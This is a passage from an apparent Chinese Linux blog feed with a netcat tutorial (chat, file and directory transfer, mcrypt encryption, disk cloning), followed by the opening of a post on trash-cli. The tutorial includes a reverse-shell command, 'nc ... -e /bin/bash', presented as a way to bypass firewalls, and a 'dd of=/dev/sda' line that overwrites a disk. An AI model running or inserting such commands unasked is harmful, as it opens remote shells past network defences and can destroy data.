&#x547D;&#x4EE4;&#x4F1A;&#x8FDE;&#x63A5;&#x5F00;&#x653E;&#x7AEF;&#x53E3;21&#x5E76;&#x4E14;&#x6253;&#x5370;&#x8FD0;&#x884C;&#x5728;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#x4E0A;&#x670D;&#x52A1;&#x7684;banner&#x4FE1;&#x606F;&#x3002;</p><h4 id="C-S-Chat-Server-&#x804A;&#x5929;"><a href="#C-S-Chat-Server-&#x804A;&#x5929;" class="headerlink" title="C S(Chat Server) &#x804A;&#x5929;"></a>C S(Chat Server) &#x804A;&#x5929;</h4><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>netcat &#x547D;&#x4EE4;&#x5728;1567&#x7AEF;&#x53E3;&#x542F;&#x52A8;&#x4E86;&#x4E00;&#x4E2A;tcp &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x548C;&#x8F93;&#x5165;&#x4F1A;&#x8F93;&#x51FA;&#x5230;&#x8BE5;&#x7AEF;&#x53E3;&#x3002;&#x8F93;&#x51FA;&#x548C;&#x8F93;&#x5165;&#x90FD;&#x5728;&#x6B64;shell&#x4E2D;&#x5C55;&#x793A;&#x3002;</p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc 192.168.10.10 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E0D;&#x7BA1;&#x4F60;&#x5728;&#x673A;&#x5668;B&#x4E0A;&#x952E;&#x5165;&#x4EC0;&#x4E48;&#x90FD;&#x4F1A;&#x51FA;&#x73B0;&#x5728;&#x673A;&#x5668;A&#x4E0A;&#x3002;</p><h4 id="&#x6587;&#x4EF6;&#x4F20;&#x8F93;"><a href="#&#x6587;&#x4EF6;&#x4F20;&#x8F93;" class="headerlink" title="&#x6587;&#x4EF6;&#x4F20;&#x8F93;"></a>&#x6587;&#x4EF6;&#x4F20;&#x8F93;</h4><p>&#x5927;&#x90E8;&#x5206;&#x65F6;&#x95F4;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x90FD;&#x5728;&#x8BD5;&#x56FE;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x5DE5;&#x5177;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#x3002;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x65B9;&#x6CD5;&#xFF0C;&#x6BD4;&#x5982;FTP,SCP,SMB&#x7B49;&#x7B49;&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x4F60;&#x53EA;&#x662F;&#x9700;&#x8981;&#x4E34;&#x65F6;&#x6216;&#x8005;&#x4E00;&#x6B21;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#xFF0C;&#x771F;&#x7684;&#x503C;&#x5F97;&#x6D6A;&#x8D39;&#x65F6;&#x95F4;&#x6765;&#x5B89;&#x88C5;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x8F6F;&#x4EF6;&#x5230;&#x4F60;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x561B;&#x3002;&#x5047;&#x8BBE;&#xFF0C;&#x4F60;&#x60F3;&#x8981;&#x4F20;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;testfile.txt &#x4ECE;A &#x5230;B&#x3002;A&#x6216;&#x8005;B&#x90FD;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x670D;&#x52A1;&#x5668;&#x6216;&#x8005;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4EE5;&#x4E0B;&#xFF0C;&#x8BA9;A&#x4F5C;&#x4E3A;&#x670D;&#x52A1;&#x5668;&#xFF0C;B&#x4E3A;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l 10010 &lt; testfile.txt</span><br></pre></td></tr></tbody></table></figure><p></p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -n 192.168.10.10 10010 &gt; testfile.txt</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x5728;A&#x4E0A;&#x5E76;&#x4E14;&#x91CD;&#x5B9A;&#x5411;netcat&#x7684;&#x8F93;&#x5165;&#x4E3A;&#x6587;&#x4EF6;testfile.txt&#xFF0C;&#x90A3;&#x4E48;&#x5F53;&#x4EFB;&#x4F55;&#x6210;&#x529F;&#x8FDE;&#x63A5;&#x5230;&#x8BE5;&#x7AEF;&#x53E3;&#xFF0C;netcat&#x4F1A;&#x53D1;&#x9001;file&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3002;<br>&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x6211;&#x4EEC;&#x91CD;&#x5B9A;&#x5411;&#x8F93;&#x51FA;&#x5230;testfile.txt&#xFF0C;&#x5F53;B&#x8FDE;&#x63A5;&#x5230;A&#xFF0C;A&#x53D1;&#x9001;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF0C;B&#x4FDD;&#x5B58;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5230;testfile.txt.</p><p>&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#x6E90;&#x4F5C;&#x4E3A;Server&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x76F8;&#x53CD;&#x7684;&#x65B9;&#x6CD5;&#x4F7F;&#x7528;&#x3002;&#x50CF;&#x4E0B;&#x9762;&#x7684;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x6587;&#x4EF6;&#x4ECE;B&#x5230;A&#xFF0C;&#x4F46;&#x662F;&#x670D;&#x52A1;&#x5668;&#x521B;&#x5EFA;&#x5728;A&#x4E0A;&#xFF0C;&#x8FD9;&#x6B21;&#x6211;&#x4EEC;&#x4EC5;&#x9700;&#x8981;&#x91CD;&#x5B9A;&#x5411;netcat&#x7684;&#x8F93;&#x51FA;&#x5E76;&#x4E14;&#x91CD;&#x5B9A;&#x5411;B&#x7684;&#x8F93;&#x5165;&#x6587;&#x4EF6;&#x3002;</p><h4 id="&#x76EE;&#x5F55;&#x4F20;&#x8F93;"><a href="#&#x76EE;&#x5F55;&#x4F20;&#x8F93;" class="headerlink" title="&#x76EE;&#x5F55;&#x4F20;&#x8F93;"></a>&#x76EE;&#x5F55;&#x4F20;&#x8F93;</h4><p>&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x53D1;&#x9001;&#x591A;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x6216;&#x8005;&#x6574;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x4E00;&#x6837;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x538B;&#x7F29;&#x5DE5;&#x5177;tar&#xFF0C;&#x538B;&#x7F29;&#x540E;&#x53D1;&#x9001;&#x538B;&#x7F29;&#x5305;&#x3002;</p><p>&#x5982;&#x679C;&#x4F60;&#x60F3;&#x8981;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x4ECE;A&#x5230;B&#x3002;</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cvf - dir_name | nc -n 192.168.10.10 10010</span><br><span class="line">$ tar -cvf - dir_name | nc 192.168.10.10 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l 10010 | tar -xvf -</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x5728;A&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;tar&#x5F52;&#x6863;&#x5305;&#x5E76;&#x4E14;&#x901A;&#x8FC7;-&#x5728;&#x63A7;&#x5236;&#x53F0;&#x91CD;&#x5B9A;&#x5411;&#x5B83;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;&#x7BA1;&#x9053;&#xFF0C;&#x91CD;&#x5B9A;&#x5411;&#x7ED9;netcat&#xFF0C;netcat&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x53D1;&#x9001;&#x5B83;&#x3002;</p><p>&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x6211;&#x4EEC;&#x4E0B;&#x8F7D;&#x8BE5;&#x538B;&#x7F29;&#x5305;&#x901A;&#x8FC7;netcat &#x7BA1;&#x9053;&#x7136;&#x540E;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x3002;</p><p>&#x5982;&#x679C;&#x60F3;&#x8981;&#x8282;&#x7701;&#x5E26;&#x5BBD;&#x4F20;&#x8F93;&#x538B;&#x7F29;&#x5305;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<strong>bzip2</strong>&#x6216;&#x8005;&#x5176;&#x4ED6;&#x5DE5;&#x5177;&#x538B;&#x7F29;&#x3002;</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar -cvf - dir_name| bzip2 -z | nc -n 192.168.10.10 10010</span><br><span class="line">$ tar -cvf - dir_name| bzip2 -z | nc 192.168.10.10 10010</span><br><span class="line"><span class="comment">#&#x4F7F;&#x7528; bzip2 &#x538B;&#x7F29;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l 10010 | bzip2 -d | tar -xvf -</span><br><span class="line"><span class="comment">#&#x4F7F;&#x7528; bzip2 &#x89E3;&#x538B;&#x7F29;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="&#x52A0;&#x5BC6;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;"><a href="#&#x52A0;&#x5BC6;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;" class="headerlink" title="&#x52A0;&#x5BC6;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;"></a>&#x52A0;&#x5BC6;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x53D1;&#x9001;&#x7684;&#x6570;&#x636E;</h4><p>&#x5982;&#x679C;&#x4F60;&#x62C5;&#x5FC3;&#x4F60;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x53D1;&#x9001;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x53D1;&#x9001;&#x4F60;&#x7684;&#x6570;&#x636E;&#x4E4B;&#x524D;&#x7528;&#x5982; <strong>mcrypt</strong> &#x7684;&#x5DE5;&#x5177;&#x52A0;&#x5BC6;&#x3002;</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc localhost 10010 | mcrypt -flush -bare -F -q -d -m ecb &gt; testfile.txt</span><br><span class="line"><span class="comment">#&#x4F7F;&#x7528;mcrypt&#x5DE5;&#x5177;&#x52A0;&#x5BC6;&#x6570;&#x636E;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mcrypt -flush -bare -F -q -m ecb &lt; testfile.txt | nc -l 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528;mcrypt&#x5DE5;&#x5177;&#x89E3;&#x5BC6;&#x6570;&#x636E;&#x3002;</p><p>&#x4EE5;&#x4E0A;&#x4E24;&#x4E2A;&#x547D;&#x4EE4;&#x4F1A;&#x63D0;&#x793A;&#x9700;&#x8981;&#x5BC6;&#x7801;&#xFF0C;&#x786E;&#x4FDD;&#x4E24;&#x7AEF;&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x7684;&#x5BC6;&#x7801;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x662F;&#x4F7F;&#x7528;mcrypt&#x7528;&#x6765;&#x52A0;&#x5BC6;&#xFF0C;&#x4F7F;&#x7528;&#x5176;&#x5B83;&#x4EFB;&#x610F;&#x52A0;&#x5BC6;&#x5DE5;&#x5177;&#x90FD;&#x53EF;&#x4EE5;&#x3002;</p><h4 id="&#x53CD;&#x5411;-SHELL"><a href="#&#x53CD;&#x5411;-SHELL" class="headerlink" title="&#x53CD;&#x5411; SHELL"></a>&#x53CD;&#x5411; SHELL</h4><p>&#x53CD;&#x5411;shell&#x662F;&#x6307;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x6253;&#x5F00;&#x7684;shell&#x3002;&#x53CD;&#x5411;shell&#x8FD9;&#x6837;&#x547D;&#x540D;&#x662F;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x4E8E;&#x5176;&#x4ED6;&#x914D;&#x7F6E;&#xFF0C;&#x8FD9;&#x91CC;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x7531;&#x5BA2;&#x6237;&#x63D0;&#x4F9B;&#x7684;&#x670D;&#x52A1;&#x3002;</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -l 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x7B80;&#x5355;&#x5730;&#x544A;&#x8BC9;netcat&#x5728;&#x8FDE;&#x63A5;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x6267;&#x884C;shell</p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc 192.168.10.10 10010 -e /bin/bash</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x73B0;&#x5728;&#xFF0C;&#x4EC0;&#x4E48;&#x662F;&#x53CD;&#x5411;shell&#x7684;&#x7279;&#x522B;&#x4E4B;&#x5904;&#x5462; </p><p>&#x53CD;&#x5411;shell&#x7ECF;&#x5E38;&#x88AB;&#x7528;&#x6765;&#x7ED5;&#x8FC7;&#x9632;&#x706B;&#x5899;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x5982;&#x963B;&#x6B62;&#x5165;&#x7AD9;&#x8FDE;&#x63A5;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x6211;&#x6709;&#x4E00;&#x4E2A;&#x4E13;&#x7528;IP&#x5730;&#x5740;&#x4E3A;192.168.10.10&#xFF0C;&#x6211;&#x4F7F;&#x7528;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x8FDE;&#x63A5;&#x5230;&#x5916;&#x90E8;&#x7F51;&#x7EDC;&#x3002;&#x5982;&#x679C;&#x6211;&#x60F3;&#x4ECE;&#x7F51;&#x7EDC;&#x5916;&#x90E8;&#x8BBF;&#x95EE; &#x8FD9;&#x53F0;&#x673A;&#x5668;&#x5982;10.1.1.10&#x7684;shell&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4F1A;&#x7528;&#x53CD;&#x5411;&#x5916;&#x58F3;&#x7528;&#x4E8E;&#x8FD9;&#x4E00;&#x76EE;&#x7684;&#x3002; </p><h4 id="&#x514B;&#x9686;&#x8BBE;&#x5907;"><a href="#&#x514B;&#x9686;&#x8BBE;&#x5907;" class="headerlink" title="&#x514B;&#x9686;&#x8BBE;&#x5907;"></a>&#x514B;&#x9686;&#x8BBE;&#x5907;</h4><p>&#x5982;&#x679C;&#x4F60;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x914D;&#x7F6E;&#x4E00;&#x53F0;Linux&#x673A;&#x5668;&#x5E76;&#x4E14;&#x9700;&#x8981;&#x91CD;&#x590D;&#x540C;&#x6837;&#x7684;&#x64CD;&#x4F5C;&#x5BF9;&#x5176;&#x4ED6;&#x7684;&#x673A;&#x5668;&#xFF0C;&#x800C;&#x4F60;&#x4E0D;&#x60F3;&#x5728;&#x91CD;&#x590D;&#x914D;&#x7F6E;&#x4E00;&#x904D;&#x3002;&#x4E0D;&#x5728;&#x9700;&#x8981;&#x91CD;&#x590D;&#x914D;&#x7F6E;&#x5B89;&#x88C5;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x53EA;&#x542F;&#x52A8;&#x53E6;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x7684;&#x4E00;&#x4E9B;&#x5F15;&#x5BFC;&#x53EF;&#x4EE5;&#x968F;&#x8EAB;&#x789F;&#x548C;&#x514B;&#x9686;&#x4F60;&#x7684;&#x673A;&#x5668;&#x3002;</p><p>&#x514B;&#x9686;Linux PC&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x5047;&#x5982;&#x4F60;&#x7684;&#x7CFB;&#x7EDF;&#x5728;&#x78C1;&#x76D8;/dev/sda&#x4E0A;</p><p>Server<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=/dev/sda | nc -l 10010</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x7B80;&#x5355;&#x5730;&#x544A;&#x8BC9;netcat&#x5728;&#x8FDE;&#x63A5;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x6267;&#x884C;shell</p><p>Client<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -n 192.168.10.10 10010 | dd of=/dev/sda</span><br></pre></td></tr></tbody></table></figure><p></p><p>dd&#x662F;&#x4E00;&#x4E2A;&#x4ECE;&#x78C1;&#x76D8;&#x8BFB;&#x53D6;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x6211;&#x901A;&#x8FC7;netcat&#x670D;&#x52A1;&#x5668;&#x91CD;&#x5B9A;&#x5411;&#x5B83;&#x7684;&#x8F93;&#x51FA;&#x6D41;&#x5230;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x5E76;&#x4E14;&#x5199;&#x5165;&#x5230;&#x78C1;&#x76D8;&#x4E2D;&#xFF0C;&#x5B83;&#x4F1A;&#x968F;&#x7740;&#x5206;&#x533A;&#x8868;&#x62F7;&#x8D1D;&#x6240;&#x6709;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x4F46;&#x662F;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x505A;&#x8FC7;&#x5206;&#x533A;&#x5E76;&#x4E14;&#x53EA;&#x9700;&#x8981;&#x514B;&#x9686;root&#x5206;&#x533A;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x6211;&#x4EEC;&#x7CFB;&#x7EDF;root&#x5206;&#x533A;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x66F4;&#x6539;sda &#x4E3A;sda1&#xFF0C;sda2.&#x7B49;&#x7B49;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http:
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>防止 rm -rf 误删带来的灾难</title>
    <link href="https://jiemin.wang/2019/03/20/trash-cli/"/>
    <id>https://jiemin.wang/2019/03/20/trash-cli/</id>
    <published>2019-03-20T09:42:01.000Z</published>
    <updated>2019-03-20T10:04:37.894Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><h4 id="&#x641E;&#x8FC7;&#x8FD0;&#x7EF4;&#x60F3;&#x8FC7;&#x884C;&#x4E1A;&#x7684;&#x6DEB;&#x4EEC;&#x90FD;&#x6709;&#x8FC7;rm&#x4E4B;&#x4F24;&#xFF0C;&#x9020;&#x6210;&#x8840;&#x7684;&#x6559;&#x8BAD;&#x3002;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x4EE5;&#x540E;&#x624D;&#x51FA;&#x73B0;&#x7C7B;&#x4F3C;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5F3A;&#x70C8;&#x5EFA;&#x8BAE;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x5343;&#x4E07;&#x4E0D;&#x8981;&#x4F7F;&#x7528;rm-rf-&#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x592A;&#x5371;&#x9669;&#x4E86;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x5B66;&#x5B66;Ubuntu-MacOS&#x7B49;&#x7CFB;&#x7EDF;&#x6709;&#x4E00;&#x4E2A;&#x56DE;&#x6536;&#x7AD9;&#xFF0C;&#x5220;&#x9664;&#x4E86;&#x53EF;&#x4EE5;&#x53BB;&#x56DE;&#x6536;&#x7AD9;&#x91CC;&#x9762;&#x627E;&#x3002;&#x7ECF;&#x8FC7;&#x6298;&#x817E;&#x4E00;&#x756A;&#xFF0C;&#x7EC8;&#x4E8E;&#x627E;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x5DE5;&#x5177;-trash-cli&#x3002;"><a href="#&#x641E;&#x8FC7;&#x8FD0;&#x7EF4;&#x60F3;&#x8FC7;&#x884C;&#x4E1A;&#x7684;&#x6DEB;&#x4EEC;&#x90FD;&#x6709;&#x8FC7;rm&#x4E4B;&#x4F24;&#xFF0C;&#x9020;&#x6210;&#x8840;&#x7684;&#x6559;&#x8BAD;&#x3002;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x4EE5;&#x540E;&#x624D;&#x51FA;&#x73B0;&#x7C7B;&#x4F3C;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5F3A;&#x70C8;&#x5EFA;&#x8BAE;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x5343;&#x4E07;&#x4E0D;&#x8981;&#x4F7F;&#x7528;rm-rf-&#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x592A;&#x5371;&#x9669;&#x4E86;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x5B66;&#x5B66;Ubuntu-MacOS&#x7B49;&#x7CFB;&#x7EDF;&#x6709;&#x4E00;&#x4E2A;&#x56DE;&#x6536;&#x7AD9;&#xFF0C;&#x5220;&#x9664;&#x4E86;&#x53EF;&#x4EE5;&#x53BB;&#x56DE;&#x6536;&#x7AD9;&#x91CC;&#x9762;&#x627E;&#x3002;&#x7ECF;&#x8FC7;&#x6298;&#x817E;&#x4E00;&#x756A;&#xFF0C;&#x7EC8;&#x4E8E;&#x627E;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x5DE5;&#x5177;-trash-cli&#x3002;" class="headerlink" title="&#x641E;&#x8FC7;&#x8FD0;&#x7EF4;&#x60F3;&#x8FC7;&#x884C;&#x4E1A;&#x7684;&#x6DEB;&#x4EEC;&#x90FD;&#x6709;&#x8FC7;rm&#x4E4B;&#x4F24;&#xFF0C;&#x9020;&#x6210;&#x8840;&#x7684;&#x6559;&#x8BAD;&#x3002;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x4EE5;&#x540E;&#x624D;&#x51FA;&#x73B0;&#x7C7B;&#x4F3C;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5F3A;&#x70C8;&#x5EFA;&#x8BAE;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x5343;&#x4E07;&#x4E0D;&#x8981;&#x4F7F;&#x7528;rm -rf &#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x592A;&#x5371;&#x9669;&#x4E86;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x5B66;&#x5B66;Ubuntu/MacOS&#x7B49;&#x7CFB;&#x7EDF;&#x6709;&#x4E00;&#x4E2A;&#x56DE;&#x6536;&#x7AD9;&#xFF0C;&#x5220;&#x9664;&#x4E86;&#x53EF;&#x4EE5;&#x53BB;&#x56DE;&#x6536;&#x7AD9;&#x91CC;&#x9762;&#x627E;&#x3002;&#x7ECF;&#x8FC7;&#x6298;&#x817E;&#x4E00;&#x756A;&#xFF0C;&#x7EC8;&#x4E8E;&#x627E;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x5DE5;&#x5177; trash-cli&#x3002;"></a>&#x641E;&#x8FC7;&#x8FD0;&#x7EF4;&#x60F3;&#x8FC7;&#x884C;&#x4E1A;&#x7684;&#x6DEB;&#x4EEC;&#x90FD;&#x6709;&#x8FC7;rm&#x4E4B;&#x4F24;&#xFF0C;&#x9020;&#x6210;&#x8840;&#x7684;&#x6559;&#x8BAD;&#x3002;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x4EE5;&#x540E;&#x624D;&#x51FA;&#x73B0;&#x7C7B;&#x4F3C;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5F3A;&#x70C8;&#x5EFA;&#x8BAE;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x5343;&#x4E07;&#x4E0D;&#x8981;&#x4F7F;&#x7528;rm -rf &#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x592A;&#x5371;&#x9669;&#x4E86;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x5B66;&#x5B66;Ubuntu/MacOS&#x7B49;&#x7CFB;&#x7EDF;&#x6709;&#x4E00;&#x4E2A;&#x56DE;&#x6536;&#x7AD9;&#xFF0C;&#x5220;&#x9664;&#x4E86;&#x53EF;&#x4EE5;&#x53BB;&#x56DE;&#x6536;&#x7AD9;&#x91CC;&#x9762;&#x627E;&#x3002;&#x7ECF;&#x8FC7;&#x6298;&#x817E;&#x4E00;&#x756A;&#xFF0C;&#x7EC8;&#x4E8E;&#x627E;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x5DE5;&#x5177; trash-cli&#x3002;</h4><h4 id="trash-cli&#x662F;&#x4E00;&#x4E2A;&#x4F7F;&#x7528;-python-&#x5F00;&#x53D1;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#xFF0C;trash-cli-trashes&#x8BB0;&#x5F55;&#x539F;&#x59CB;&#x8DEF;&#x5F84;&#xFF0C;&#x5220;&#x9664;&#x65E5;&#x671F;&#x548C;&#x6743;&#x9650;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5B83;&#x4F7F;&#x7528;KDE&#xFF0C;GNOME&#x548C;XFCE&#x4F7F;&#x7528;&#x7684;&#x76F8;&#x540C;&#x5783;&#x573E;&#x6876;&#xFF0C;&#x4F46;&#x60A8;&#x53EF;&#x4EE5;&#x4ECE;&#x547D;&#x4EE4;&#x884C;&#xFF08;&#x548C;&#x811A;&#x672C;&#xFF09;&#x8C03;&#x7528;&#x5B83;&#x3002;&#x5305;&#x542B;"><a 